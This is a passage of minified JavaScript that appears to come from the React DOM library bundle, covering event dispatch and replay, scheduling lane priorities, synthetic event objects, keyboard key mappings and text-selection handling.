                    link: !0,
                    meta: !0,
                    param: !0,
                    source: !0,
                    track: !0,
                    wbr: !0
                });

                function we(e, t) {
                    if (t) {
                        if (me[e] && (null != t.children || null != t.dangerouslySetInnerHTML)) throw Error(o(137, e));
                        if (null != t.dangerouslySetInnerHTML) {
                            if (null != t.children) throw Error(o(60));
                            if ("object" !== typeof t.dangerouslySetInnerHTML || !("__html" in t.dangerouslySetInnerHTML)) throw Error(o(61))
                        }
                        if (null != t.style && "object" !== typeof t.style) throw Error(o(62))
                    }
                }

                function be(e, t) {
                    if (-1 === e.indexOf("-")) return "string" === typeof t.is;
                    switch (e) {
                        case "annotation-xml":
                        case "color-profile":
                        case "font-face":
                        case "font-face-src":
                        case "font-face-uri":
                        case "font-face-format":
                        case "font-face-name":
                        case "missing-glyph":
                            return !1;
                        default:
                            return !0
                    }
                }
                var ve = null;

                function Ae(e) {
                    return (e = e.target || e.srcElement || window).correspondingUseElement && (e = e.correspondingUseElement), 3 === e.nodeType ? e.parentNode : e
                }
                var ke = null,
                    _e = null,
                    Ee = null;

                function Se(e) {
                    if (e = bi(e)) {
                        if ("function" !== typeof ke) throw Error(o(280));
                        var t = e.stateNode;
                        t && (t = Ai(t), ke(e.stateNode, e.type, t))
                    }
                }

                function Ie(e) {
                    _e ? Ee ? Ee.push(e) : Ee = [e] : _e = e
                }

                function xe() {
                    if (_e) {
                        var e = _e,
                            t = Ee;
                        if (Ee = _e = null, Se(e), t)
                            for (e = 0; e < t.length; e++) Se(t[e])
                    }
                }

                function Me(e, t) {
                    return e(t)
                }

                function Be() {}
                var Te = !1;

                function Oe(e, t, n) {
                    if (Te) return e(t, n);
                    Te = !0;
                    try {
                        return Me(e, t, n)
                    } finally {
                        Te = !1, (null !== _e || null !== Ee) && (Be(), xe())
                    }
                }

                function Ce(e, t) {
                    var n = e.stateNode;
                    if (null === n) return null;
                    var r = Ai(n);
                    if (null === r) return null;
                    n = r[t];
                    e: switch (t) {
                        case "onClick":
                        case "onClickCapture":
                        case "onDoubleClick":
                        case "onDoubleClickCapture":
                        case "onMouseDown":
                        case "onMouseDownCapture":
                        case "onMouseMove":
                        case "onMouseMoveCapture":
                        case "onMouseUp":
                        case "onMouseUpCapture":
                        case "onMouseEnter":
                            (r = !r.disabled) || (r = !("button" === (e = e.type) || "input" === e || "select" === e || "textarea" === e)), e = !r;
                            break e;
                        default:
                            e = !1
                    }
                    if (e) return null;
                    if (n && "function" !== typeof n) throw Error(o(231, t, typeof n));
                    return n
                }
                var Pe = !1;
                if (l) try {
                    var Le = {};
                    Object.defineProperty(Le, "passive", {
                        get: function() {
                            Pe = !0
                        }
                    }), window.addEventListener("test", Le, Le), window.removeEventListener("test", Le, Le)
                } catch (le) {
                    Pe = !1
                }

                function Ne(e, t, n, r, i, o, s, a, u) {
                    var c = Array.prototype.slice.call(arguments, 3);
                    try {
                        t.apply(n, c)
                    } catch (l) {
                        this.onError(l)
                    }
                }
                var Re = !1,
                    De = null,
                    ze = !1,
                    Ue = null,
                    je = {
                        onError: function(e) {
                            Re = !0, De = e
                        }
                    };

                function Fe(e, t, n, r, i, o, s, a, u) {
                    Re = !1, De = null, Ne.apply(je, arguments)
                }

                function He(e) {
                    var t = e,
                        n = e;
                    if (e.alternate)
                        for (; t.return;) t = t.return;
                    else {
                        e = t;
                        do {
                            0 !== (4098 & (t = e).flags) && (n = t.return), e = t.return
                        } while (e)
                    }
                    return 3 === t.tag ? n : null
                }

                function We(e) {
                    if (13 === e.tag) {
                        var t = e.memoizedState;
                        if (null === t && (null !== (e = e.alternate) && (t = e.memoizedState)), null !== t) return t.dehydrated
                    }
                    return null
                }

                function Ke(e) {
                    if (He(e) !== e) throw Error(o(188))
                }

                function qe(e) {
                    return null !== (e = function(e) {
                        var t = e.alternate;
                        if (!t) {
                            if (null === (t = He(e))) throw Error(o(188));
                            return t !== e ? null : e
                        }
                        for (var n = e, r = t;;) {
                            var i = n.return;
                            if (null === i) break;
                            var s = i.alternate;
                            if (null === s) {
                                if (null !== (r = i.return)) {
                                    n = r;
                                    continue
                                }
                                break
                            }
                            if (i.child === s.child) {
                                for (s = i.child; s;) {
                                    if (s === n) return Ke(i), e;
                                    if (s === r) return Ke(i), t;
                                    s = s.sibling
                                }
                                throw Error(o(188))
                            }
                            if (n.return !== r.return) n = i, r = s;
                            else {
                                for (var a = !1, u = i.child; u;) {
                                    if (u === n) {
                                        a = !0, n = i, r = s;
                                        break
                                    }
                                    if (u === r) {
                                        a = !0, r = i, n = s;
                                        break
                                    }
                                    u = u.sibling
                                }
                                if (!a) {
                                    for (u = s.child; u;) {
                                        if (u === n) {
                                            a = !0, n = s, r = i;
                                            break
                                        }
                                        if (u === r) {
                                            a = !0, r = s, n = i;
                                            break
                                        }
                                        u = u.sibling
                                    }
                                    if (!a) throw Error(o(189))
                                }
                            }
                            if (n.alternate !== r) throw Error(o(190))
                        }
                        if (3 !== n.tag) throw Error(o(188));
                        return n.stateNode.current === n ? e : t
                    }(e)) ? Ve(e) : null
                }

                function Ve(e) {
                    if (5 === e.tag || 6 === e.tag) return e;
                    for (e = e.child; null !== e;) {
                        var t = Ve(e);
                        if (null !== t) return t;
                        e = e.sibling
                    }
                    return null
                }
                var Qe = i.unstable_scheduleCallback,
                    Ge = i.unstable_cancelCallback,
                    Ye = i.unstable_shouldYield,
                    Ze = i.unstable_requestPaint,
                    Je = i.unstable_now,
                    Xe = i.unstable_getCurrentPriorityLevel,
                    $e = i.unstable_ImmediatePriority,
                    et = i.unstable_UserBlockingPriority,
                    tt = i.unstable_NormalPriority,
                    nt = i.unstable_LowPriority,
                    rt = i.unstable_IdlePriority,
                    it = null,
                    ot = null;
                var st = Math.clz32 ? Math.clz32 : function(e) {
                        return 0 === (e >>>= 0) ? 32 : 31 - (at(e) / ut | 0) | 0
                    },
                    at = Math.log,
                    ut = Math.LN2;
                var ct = 64,
                    lt = 4194304;

                function ft(e) {
                    switch (e & -e) {
                        case 1:
                            return 1;
                        case 2:
                            return 2;
                        case 4:
                            return 4;
                        case 8:
                            return 8;
                        case 16:
                            return 16;
                        case 32:
                            return 32;
                        case 64:
                        case 128:
                        case 256:
                        case 512:
                        case 1024:
                        case 2048:
                        case 4096:
                        case 8192:
                        case 16384:
                        case 32768:
                        case 65536:
                        case 131072:
                        case 262144:
                        case 524288:
                        case 1048576:
                        case 2097152:
                            return 4194240 & e;
                        case 4194304:
                        case 8388608:
                        case 16777216:
                        case 33554432:
                        case 67108864:
                            return 130023424 & e;
                        case 134217728:
                            return 134217728;
                        case 268435456:
                            return 268435456;
                        case 536870912:
                            return 536870912;
                        case 1073741824:
                            return 1073741824;
                        default:
                            return e
                    }
                }

                function ht(e, t) {
                    var n = e.pendingLanes;
                    if (0 === n) return 0;
                    var r = 0,
                        i = e.suspendedLanes,
                        o = e.pingedLanes,
                        s = 268435455 & n;
                    if (0 !== s) {
                        var a = s & ~i;
                        0 !== a ? r = ft(a) : 0 !== (o &= s) && (r = ft(o))
                    } else 0 !== (s = n & ~i) ? r = ft(s) : 0 !== o && (r = ft(o));
                    if (0 === r) return 0;
                    if (0 !== t && t !== r && 0 === (t & i) && ((i = r & -r) >= (o = t & -t) || 16 === i && 0 !== (4194240 & o))) return t;
                    if (0 !== (4 & r) && (r |= 16 & n), 0 !== (t = e.entangledLanes))
                        for (e = e.entanglements, t &= r; 0 < t;) i = 1 << (n = 31 - st(t)), r |= e[n], t &= ~i;
                    return r
                }

                function dt(e, t) {
                    switch (e) {
                        case 1:
                        case 2:
                        case 4:
                            return t + 250;
                        case 8:
                        case 16:
                        case 32:
                        case 64:
                        case 128:
                        case 256:
                        case 512:
                        case 1024:
                        case 2048:
                        case 4096:
                        case 8192:
                        case 16384:
                        case 32768:
                        case 65536:
                        case 131072:
                        case 262144:
                        case 524288:
                        case 1048576:
                        case 2097152:
                            return t + 5e3;
                        default:
                            return -1
                    }
                }

                function pt(e) {
                    return 0 !== (e = -1073741825 & e.pendingLanes) ? e : 1073741824 & e ? 1073741824 : 0
                }

                function yt() {
                    var e = ct;
                    return 0 === (4194240 & (ct <<= 1)) && (ct = 64), e
                }

                function gt(e) {
                    for (var t = [], n = 0; 31 > n; n++) t.push(e);
                    return t
                }

                function mt(e, t, n) {
                    e.pendingLanes |= t, 536870912 !== t && (e.suspendedLanes = 0, e.pingedLanes = 0), (e = e.eventTimes)[t = 31 - st(t)] = n
                }

                function wt(e, t) {
                    var n = e.entangledLanes |= t;
                    for (e = e.entanglements; n;) {
                        var r = 31 - st(n),
                            i = 1 << r;
                        i & t | e[r] & t && (e[r] |= t), n &= ~i
                    }
                }
                var bt = 0;

                function vt(e) {
                    return 1 < (e &= -e) ? 4 < e ? 0 !== (268435455 & e) ? 16 : 536870912 : 4 : 1
                }
                var At, kt, _t, Et, St, It = !1,
                    xt = [],
                    Mt = null,
                    Bt = null,
                    Tt = null,
                    Ot = new Map,
                    Ct = new Map,
                    Pt = [],
                    Lt = "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");

                function Nt(e, t) {
                    switch (e) {
                        case "focusin":
                        case "focusout":
                            Mt = null;
                            break;
                        case "dragenter":
                        case "dragleave":
                            Bt = null;
                            break;
                        case "mouseover":
                        case "mouseout":
                            Tt = null;
                            break;
                        case "pointerover":
                        case "pointerout":
                            Ot.delete(t.pointerId);
                            break;
                        case "gotpointercapture":
                        case "lostpointercapture":
                            Ct.delete(t.pointerId)
                    }
                }

                function Rt(e, t, n, r, i, o) {
                    return null === e || e.nativeEvent !== o ? (e = {
                        blockedOn: t,
                        domEventName: n,
                        eventSystemFlags: r,
                        nativeEvent: o,
                        targetContainers: [i]
                    }, null !== t && (null !== (t = bi(t)) && kt(t)), e) : (e.eventSystemFlags |= r, t = e.targetContainers, null !== i && -1 === t.indexOf(i) && t.push(i), e)
                }

                function Dt(e) {
                    var t = wi(e.target);
                    if (null !== t) {
                        var n = He(t);
                        if (null !== n)
                            if (13 === (t = n.tag)) {
                                if (null !== (t = We(n))) return e.blockedOn = t, void St(e.priority, (function() {
                                    _t(n)
                                }))
                            } else if (3 === t && n.stateNode.current.memoizedState.isDehydrated) return void(e.blockedOn = 3 === n.tag ? n.stateNode.containerInfo : null)
                    }
                    e.blockedOn = null
                }

                function zt(e) {
                    if (null !== e.blockedOn) return !1;
                    for (var t = e.targetContainers; 0 < t.length;) {
                        var n = Yt(e.domEventName, e.eventSystemFlags, t[0], e.nativeEvent);
                        if (null !== n) return null !== (t = bi(n)) && kt(t), e.blockedOn = n, !1;
                        var r = new(n = e.nativeEvent).constructor(n.type, n);
                        ve = r, n.target.dispatchEvent(r), ve = null, t.shift()
                    }
                    return !0
                }

                function Ut(e, t, n) {
                    zt(e) && n.delete(t)
                }

                function jt() {
                    It = !1, null !== Mt && zt(Mt) && (Mt = null), null !== Bt && zt(Bt) && (Bt = null), null !== Tt && zt(Tt) && (Tt = null), Ot.forEach(Ut), Ct.forEach(Ut)
                }

                function Ft(e, t) {
                    e.blockedOn === t && (e.blockedOn = null, It || (It = !0, i.unstable_scheduleCallback(i.unstable_NormalPriority, jt)))
                }

                function Ht(e) {
                    function t(t) {
                        return Ft(t, e)
                    }
                    if (0 < xt.length) {
                        Ft(xt[0], e);
                        for (var n = 1; n < xt.length; n++) {
                            var r = xt[n];
                            r.blockedOn === e && (r.blockedOn = null)
                        }
                    }
                    for (null !== Mt && Ft(Mt, e), null !== Bt && Ft(Bt, e), null !== Tt && Ft(Tt, e), Ot.forEach(t), Ct.forEach(t), n = 0; n < Pt.length; n++)(r = Pt[n]).blockedOn === e && (r.blockedOn = null);
                    for (; 0 < Pt.length && null === (n = Pt[0]).blockedOn;) Dt(n), null === n.blockedOn && Pt.shift()
                }
                var Wt = v.ReactCurrentBatchConfig,
                    Kt = !0;

                function qt(e, t, n, r) {
                    var i = bt,
                        o = Wt.transition;
                    Wt.transition = null;
                    try {
                        bt = 1, Qt(e, t, n, r)
                    } finally {
                        bt = i, Wt.transition = o
                    }
                }

                function Vt(e, t, n, r) {
                    var i = bt,
                        o = Wt.transition;
                    Wt.transition = null;
                    try {
                        bt = 4, Qt(e, t, n, r)
                    } finally {
                        bt = i, Wt.transition = o
                    }
                }

                function Qt(e, t, n, r) {
                    if (Kt) {
                        var i = Yt(e, t, n, r);
                        if (null === i) Kr(e, t, r, Gt, n), Nt(e, r);
                        else if (function(e, t, n, r, i) {
                                switch (t) {
                                    case "focusin":
                                        return Mt = Rt(Mt, e, t, n, r, i), !0;
                                    case "dragenter":
                                        return Bt = Rt(Bt, e, t, n, r, i), !0;
                                    case "mouseover":
                                        return Tt = Rt(Tt, e, t, n, r, i), !0;
                                    case "pointerover":
                                        var o = i.pointerId;
                                        return Ot.set(o, Rt(Ot.get(o) || null, e, t, n, r, i)), !0;
                                    case "gotpointercapture":
                                        return o = i.pointerId, Ct.set(o, Rt(Ct.get(o) || null, e, t, n, r, i)), !0
                                }
                                return !1
                            }(i, e, t, n, r)) r.stopPropagation();
                        else if (Nt(e, r), 4 & t && -1 < Lt.indexOf(e)) {
                            for (; null !== i;) {
                                var o = bi(i);
                                if (null !== o && At(o), null === (o = Yt(e, t, n, r)) && Kr(e, t, r, Gt, n), o === i) break;
                                i = o
                            }
                            null !== i && r.stopPropagation()
                        } else Kr(e, t, r, null, n)
                    }
                }
                var Gt = null;

                function Yt(e, t, n, r) {
                    if (Gt = null, null !== (e = wi(e = Ae(r))))
                        if (null === (t = He(e))) e = null;
                        else if (13 === (n = t.tag)) {
                        if (null !== (e = We(t))) return e;
                        e = null
                    } else if (3 === n) {
                        if (t.stateNode.current.memoizedState.isDehydrated) return 3 === t.tag ? t.stateNode.containerInfo : null;
                        e = null
                    } else t !== e && (e = null);
                    return Gt = e, null
                }

                function Zt(e) {
                    switch (e) {
                        case "cancel":
                        case "click":
                        case "close":
                        case "contextmenu":
                        case "copy":
                        case "cut":
                        case "auxclick":
                        case "dblclick":
                        case "dragend":
                        case "dragstart":
                        case "drop":
                        case "focusin":
                        case "focusout":
                        case "input":
                        case "invalid":
                        case "keydown":
                        case "keypress":
                        case "keyup":
                        case "mousedown":
                        case "mouseup":
                        case "paste":
                        case "pause":
                        case "play":
                        case "pointercancel":
                        case "pointerdown":
                        case "pointerup":
                        case "ratechange":
                        case "reset":
                        case "resize":
                        case "seeked":
                        case "submit":
                        case "touchcancel":
                        case "touchend":
                        case "touchstart":
                        case "volumechange":
                        case "change":
                        case "selectionchange":
                        case "textInput":
                        case "compositionstart":
                        case "compositionend":
                        case "compositionupdate":
                        case "beforeblur":
                        case "afterblur":
                        case "beforeinput":
                        case "blur":
                        case "fullscreenchange":
                        case "focus":
                        case "hashchange":
                        case "popstate":
                        case "select":
                        case "selectstart":
                            return 1;
                        case "drag":
                        case "dragenter":
                        case "dragexit":
                        case "dragleave":
                        case "dragover":
                        case "mousemove":
                        case "mouseout":
                        case "mouseover":
                        case "pointermove":
                        case "pointerout":
                        case "pointerover":
                        case "scroll":
                        case "toggle":
                        case "touchmove":
                        case "wheel":
                        case "mouseenter":
                        case "mouseleave":
                        case "pointerenter":
                        case "pointerleave":
                            return 4;
                        case "message":
                            switch (Xe()) {
                                case $e:
                                    return 1;
                                case et:
                                    return 4;
                                case tt:
                                case nt:
                                    return 16;
                                case rt:
                                    return 536870912;
                                default:
                                    return 16
                            }
                        default:
                            return 16
                    }
                }
                var Jt = null,
                    Xt = null,
                    $t = null;

                function en() {
                    if ($t) return $t;
                    var e, t, n = Xt,
                        r = n.length,
                        i = "value" in Jt ? Jt.value : Jt.textContent,
                        o = i.length;
                    for (e = 0; e < r && n[e] === i[e]; e++);
                    var s = r - e;
                    for (t = 1; t <= s && n[r - t] === i[o - t]; t++);
                    return $t = i.slice(e, 1 < t ? 1 - t : void 0)
                }

                function tn(e) {
                    var t = e.keyCode;
                    return "charCode" in e ? 0 === (e = e.charCode) && 13 === t && (e = 13) : e = t, 10 === e && (e = 13), 32 <= e || 13 === e ? e : 0
                }

                function nn() {
                    return !0
                }

                function rn() {
                    return !1
                }

                function on(e) {
                    function t(t, n, r, i, o) {
                        for (var s in this._reactName = t, this._targetInst = r, this.type = n, this.nativeEvent = i, this.target = o, this.currentTarget = null, e) e.hasOwnProperty(s) && (t = e[s], this[s] = t ? t(i) : i[s]);
                        return this.isDefaultPrevented = (null != i.defaultPrevented ? i.defaultPrevented : !1 === i.returnValue) ? nn : rn, this.isPropagationStopped = rn, this
                    }
                    return D(t.prototype, {
                        preventDefault: function() {
                            this.defaultPrevented = !0;
                            var e = this.nativeEvent;
                            e && (e.preventDefault ? e.preventDefault() : "unknown" !== typeof e.returnValue && (e.returnValue = !1), this.isDefaultPrevented = nn)
                        },
                        stopPropagation: function() {
                            var e = this.nativeEvent;
                            e && (e.stopPropagation ? e.stopPropagation() : "unknown" !== typeof e.cancelBubble && (e.cancelBubble = !0), this.isPropagationStopped = nn)
                        },
                        persist: function() {},
                        isPersistent: nn
                    }), t
                }
                var sn, an, un, cn = {
                        eventPhase: 0,
                        bubbles: 0,
                        cancelable: 0,
                        timeStamp: function(e) {
                            return e.timeStamp || Date.now()
                        },
                        defaultPrevented: 0,
                        isTrusted: 0
                    },
                    ln = on(cn),
                    fn = D({}, cn, {
                        view: 0,
                        detail: 0
                    }),
                    hn = on(fn),
                    dn = D({}, fn, {
                        screenX: 0,
                        screenY: 0,
                        clientX: 0,
                        clientY: 0,
                        pageX: 0,
                        pageY: 0,
                        ctrlKey: 0,
                        shiftKey: 0,
                        altKey: 0,
                        metaKey: 0,
                        getModifierState: Sn,
                        button: 0,
                        buttons: 0,
                        relatedTarget: function(e) {
                            return void 0 === e.relatedTarget ? e.fromElement === e.srcElement ? e.toElement : e.fromElement : e.relatedTarget
                        },
                        movementX: function(e) {
                            return "movementX" in e ? e.movementX : (e !== un && (un && "mousemove" === e.type ? (sn = e.screenX - un.screenX, an = e.screenY - un.screenY) : an = sn = 0, un = e), sn)
                        },
                        movementY: function(e) {
                            return "movementY" in e ? e.movementY : an
                        }
                    }),
                    pn = on(dn),
                    yn = on(D({}, dn, {
                        dataTransfer: 0
                    })),
                    gn = on(D({}, fn, {
                        relatedTarget: 0
                    })),
                    mn = on(D({}, cn, {
                        animationName: 0,
                        elapsedTime: 0,
                        pseudoElement: 0
                    })),
                    wn = D({}, cn, {
                        clipboardData: function(e) {
                            return "clipboardData" in e ? e.clipboardData : window.clipboardData
                        }
                    }),
                    bn = on(wn),
                    vn = on(D({}, cn, {
                        data: 0
                    })),
                    An = {
                        Esc: "Escape",
                        Spacebar: " ",
                        Left: "ArrowLeft",
                        Up: "ArrowUp",
                        Right: "ArrowRight",
                        Down: "ArrowDown",
                        Del: "Delete",
                        Win: "OS",
                        Menu: "ContextMenu",
                        Apps: "ContextMenu",
                        Scroll: "ScrollLock",
                        MozPrintableKey: "Unidentified"
                    },
                    kn = {
                        8: "Backspace",
                        9: "Tab",
                        12: "Clear",
                        13: "Enter",
                        16: "Shift",
                        17: "Control",
                        18: "Alt",
                        19: "Pause",
                        20: "CapsLock",
                        27: "Escape",
                        32: " ",
                        33: "PageUp",
                        34: "PageDown",
                        35: "End",
                        36: "Home",
                        37: "ArrowLeft",
                        38: "ArrowUp",
                        39: "ArrowRight",
                        40: "ArrowDown",
                        45: "Insert",
                        46: "Delete",
                        112: "F1",
                        113: "F2",
                        114: "F3",
                        115: "F4",
                        116: "F5",
                        117: "F6",
                        118: "F7",
                        119: "F8",
                        120: "F9",
                        121: "F10",
                        122: "F11",
                        123: "F12",
                        144: "NumLock",
                        145: "ScrollLock",
                        224: "Meta"
                    },
                    _n = {
                        Alt: "altKey",
                        Control: "ctrlKey",
                        Meta: "metaKey",
                        Shift: "shiftKey"
                    };

                function En(e) {
                    var t = this.nativeEvent;
                    return t.getModifierState ? t.getModifierState(e) : !!(e = _n[e]) && !!t[e]
                }

                function Sn() {
                    return En
                }
                var In = D({}, fn, {
                        key: function(e) {
                            if (e.key) {
                                var t = An[e.key] || e.key;
                                if ("Unidentified" !== t) return t
                            }
                            return "keypress" === e.type ? 13 === (e = tn(e)) ? "Enter" : String.fromCharCode(e) : "keydown" === e.type || "keyup" === e.type ? kn[e.keyCode] || "Unidentified" : ""
                        },
                        code: 0,
                        location: 0,
                        ctrlKey: 0,
                        shiftKey: 0,
                        altKey: 0,
                        metaKey: 0,
                        repeat: 0,
                        locale: 0,
                        getModifierState: Sn,
                        charCode: function(e) {
                            return "keypress" === e.type ? tn(e) : 0
                        },
                        keyCode: function(e) {
                            return "keydown" === e.type || "keyup" === e.type ? e.keyCode : 0
                        },
                        which: function(e) {
                            return "keypress" === e.type ? tn(e) : "keydown" === e.type || "keyup" === e.type ? e.keyCode : 0
                        }
                    }),
                    xn = on(In),
                    Mn = on(D({}, dn, {
                        pointerId: 0,
                        width: 0,
                        height: 0,
                        pressure: 0,
                        tangentialPressure: 0,
                        tiltX: 0,
                        tiltY: 0,
                        twist: 0,
                        pointerType: 0,
                        isPrimary: 0
                    })),
                    Bn = on(D({}, fn, {
                        touches: 0,
                        targetTouches: 0,
                        changedTouches: 0,
                        altKey: 0,
                        metaKey: 0,
                        ctrlKey: 0,
                        shiftKey: 0,
                        getModifierState: Sn
                    })),
                    Tn = on(D({}, cn, {
                        propertyName: 0,
                        elapsedTime: 0,
                        pseudoElement: 0
                    })),
                    On = D({}, dn, {
                        deltaX: function(e) {
                            return "deltaX" in e ? e.deltaX : "wheelDeltaX" in e ? -e.wheelDeltaX : 0
                        },
                        deltaY: function(e) {
                            return "deltaY" in e ? e.deltaY : "wheelDeltaY" in e ? -e.wheelDeltaY : "wheelDelta" in e ? -e.wheelDelta : 0
                        },
                        deltaZ: 0,
                        deltaMode: 0
                    }),
                    Cn = on(On),
                    Pn = [9, 13, 27, 32],
                    Ln = l && "CompositionEvent" in window,
                    Nn = null;
                l && "documentMode" in document && (Nn = document.documentMode);
                var Rn = l && "TextEvent" in window && !Nn,
                    Dn = l && (!Ln || Nn && 8 < Nn && 11 >= Nn),
                    zn = String.fromCharCode(32),
                    Un = !1;

                function jn(e, t) {
                    switch (e) {
                        case "keyup":
                            return -1 !== Pn.indexOf(t.keyCode);
                        case "keydown":
                            return 229 !== t.keyCode;
                        case "keypress":
                        case "mousedown":
                        case "focusout":
                            return !0;
                        default:
                            return !1
                    }
                }

                function Fn(e) {
                    return "object" === typeof(e = e.detail) && "data" in e ? e.data : null
                }
                var Hn = !1;
                var Wn = {
                    color: !0,
                    date: !0,
                    datetime: !0,
                    "datetime-local": !0,
                    email: !0,
                    month: !0,
                    number: !0,
                    password: !0,
                    range: !0,
                    search: !0,
                    tel: !0,
                    text: !0,
                    time: !0,
                    url: !0,
                    week: !0
                };

                function Kn(e) {
                    var t = e && e.nodeName && e.nodeName.toLowerCase();
                    return "input" === t ? !!Wn[e.type] : "textarea" === t
                }

                function qn(e, t, n, r) {
                    Ie(r), 0 < (t = Vr(t, "onChange")).length && (n = new ln("onChange", "change", null, n, r), e.push({
                        event: n,
                        listeners: t
                    }))
                }
                var Vn = null,
                    Qn = null;

                function Gn(e) {
                    zr(e, 0)
                }

                function Yn(e) {
                    if (Q(vi(e))) return e
                }

                function Zn(e, t) {
                    if ("change" === e) return t
                }
                var Jn = !1;
                if (l) {
                    var Xn;
                    if (l) {
                        var $n = "oninput" in document;
                        if (!$n) {
                            var er = document.createElement("div");
                            er.setAttribute("oninput", "return;"), $n = "function" === typeof er.oninput
                        }
                        Xn = $n
                    } else Xn = !1;
                    Jn = Xn && (!document.documentMode || 9 < document.documentMode)
                }

                function tr() {
                    Vn && (Vn.detachEvent("onpropertychange", nr), Qn = Vn = null)
                }

                function nr(e) {
                    if ("value" === e.propertyName && Yn(Qn)) {
                        var t = [];
                        qn(t, Qn, e, Ae(e)), Oe(Gn, t)
                    }
                }

                function rr(e, t, n) {
                    "focusin" === e ? (tr(), Qn = n, (Vn = t).attachEvent("onpropertychange", nr)) : "focusout" === e && tr()
                }

                function ir(e) {
                    if ("selectionchange" === e || "keyup" === e || "keydown" === e) return Yn(Qn)
                }

                function or(e, t) {
                    if ("click" === e) return Yn(t)
                }

                function sr(e, t) {
                    if ("input" === e || "change" === e) return Yn(t)
                }
                var ar = "function" === typeof Object.is ? Object.is : function(e, t) {
                    return e === t && (0 !== e || 1 / e === 1 / t) || e !== e && t !== t
                };

                function ur(e, t) {
                    if (ar(e, t)) return !0;
                    if ("object" !== typeof e || null === e || "object" !== typeof t || null === t) return !1;
                    var n = Object.keys(e),
                        r = Object.keys(t);
                    if (n.length !== r.length) return !1;
                    for (r = 0; r < n.length; r++) {
                        var i = n[r];
                        if (!f.call(t, i) || !ar(e[i], t[i])) return !1
                    }
                    return !0
                }

                function cr(e) {
                    for (; e && e.firstChild;) e = e.firstChild;
                    return e
                }

                function lr(e, t) {
                    var n, r = cr(e);
                    for (e = 0; r;) {
                        if (3 === r.nodeType) {
                            if (n = e + r.textContent.length, e <= t && n >= t) return {
                                node: r,
                                offset: t - e
                            };
                            e = n
                        }
                        e: {
                            for (; r;) {
                                if (r.nextSibling) {
                                    r = r.nextSibling;
                                    break e
                                }
                                r = r.parentNode
                            }
                            r = void 0
                        }
                        r = cr(r)
                    }
                }

                function fr(e, t) {
                    return !(!e || !t) && (e === t || (!e || 3 !== e.nodeType) && (t && 3 === t.nodeType ? fr(e, t.parentNode) : "contains" in e ? e.contains(t) : !!e.compareDocumentPosition && !!(16 & e.compareDocumentPosition(t))))
                }

                function hr() {
                    for (var e = window, t = G(); t instanceof e.HTMLIFrameElement;) {
                        try {
                            var n = "string" === typeof t.contentWindow.location.href
                        } catch (r) {
                            n = !1
                        }
                        if (!n) break;
                        t = G((e = t.contentWindow).document)
                    }
                    return t
                }

                function dr(e) {
                    var t = e && e.nodeName && e.nodeName.toLowerCase();
                    return t && ("input" === t && ("text" === e.type || "search" === e.type || "tel" === e.type || "url" === e.type || "password" === e.type) || "textarea" === t || "true" === e.contentEditable)
                }

                function pr(e) {
                    var t = hr(),
                        n = e.focusedElem,
                        r = e.selectionRange;
                    if (t !== n && n && n.ownerDocument && fr(n.ownerDocument.documentElement, n)) {
                        if (null !== r && dr(n))
                            if (t = r.start, void 0 === (e = r.end) && (e = t), "selectionStart" in n) n.selectionStart = t, n.selectionEnd = Math.min(e, n.value.length);
                            else if ((e = (t = n.ownerDocument || document) && t.defaultView || window).getSelection) {
                            e = e.getSelection();
                            var i = n.textContent.length,
                                o = Math.min(r.start, i);
                            r = void 0 === r.end ? o : Math.min(r.end, i), !e.extend && o > r && (i = r, r = o, o = i), i = lr(n, o);
                            var s = lr(n, r);
                            i && s && (1 !== e.rangeCount || e.anchorNode !== i.node || e.anchorOffset !== i.offset || e.focusNode !== s.node || e.focusOffset !== s.offset) && ((t = t.createRange()).setStart(i.node, i.offset), e.removeAllRanges(), o > r ? (e.addRange(t), e.extend(s.node, s.offset)) : (t.setEnd(s.node, s.offset), e.addRange(t)))
                        }
                        for (t = [], e = n; e = e.parentNode;) 1 === e.nodeType && t.push({
                            element: e,
                            left: e.scrollLeft,
                            top: e.scrollTop
                        });
                        for ("function" === typeof n.focus && n.focus(), n = 0; n < t.length; n++)(e = t[n]).element.scrollLeft = e.left, e.element.scrollTop = e.top
                    }
                }
                var yr = l && "documentMode" in document && 11 >= document.documentMode,
                    gr = null,
                    mr = null,
                    wr = null,
                    br = !1;

                function vr(e, t, n) {
                    var r = n.window === n ? n.document : 9 === n.nodeType ? n : n.ownerDocument;
                    br || null == gr || gr !== G(r) || ("selectionStart" in (r = gr) && dr(r) ? r = {
                        start: r.selectionStart,
                        end: r.selectionEnd
                    } : r = {
                        anchorNode: (r = (r.ownerDocument && r.ownerDocument.defaultView || window).getSelection()).anchorNode,
                        anchorOffset: r.anchorOffset,
                        focusNode: r.focusNode,
                        focusOffset: r.focusOffset
                    }, wr && ur(wr, r) || (wr = r, 0 < (r = Vr(mr, "onSelect")).length && (t = new ln("onSelect", "select", null, t, n), e.push({
                        event: t,
                        listeners: r
                    }), t.target = gr)))
                }

                function Ar(e, t) {
                    var n = {};
                    return n[e.toLowerCase()] = t.toLowerCase(), n["Webkit" + e] = "webkit" + t, n["Moz" + e] = "moz" + t, n
                }
                var kr = {
                        animationend: Ar("Animation", "AnimationEnd"),
                        animationiteration: Ar("Animation", "AnimationIteration"),
                        animationstart: Ar("Animation", "AnimationStart"),
                        transitionend: Ar("Transition", "TransitionEnd")
                    },
                    _r = {},
                    Er = {};

                function Sr(e) {
                    if (_r[e]) return _r[e];
                    if (!kr[e]) return e;
                    var t, n = kr[e];
                    for (t in n)
                        if (n.hasOwnProperty(t) && t in Er) return _r[e] = n[t];
                    return e
                }
                l && (Er = document.createElement("div").style, "AnimationEvent" in window || (delete kr.animationend.animation, delete kr.animationiteration.animation, delete kr.animationstart.animation), "TransitionEvent" in window || delete kr.transitionend.transition);
                var Ir = Sr("animationend"),
                    xr = Sr("animationiteration"),
                    Mr = Sr("animationstart"),
                    Br = Sr("transitionend"),
                    Tr = new Map,
                    Or = "abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");

                function Cr(e, t) {
                    Tr.set(e, t), u(t, [e])
                }
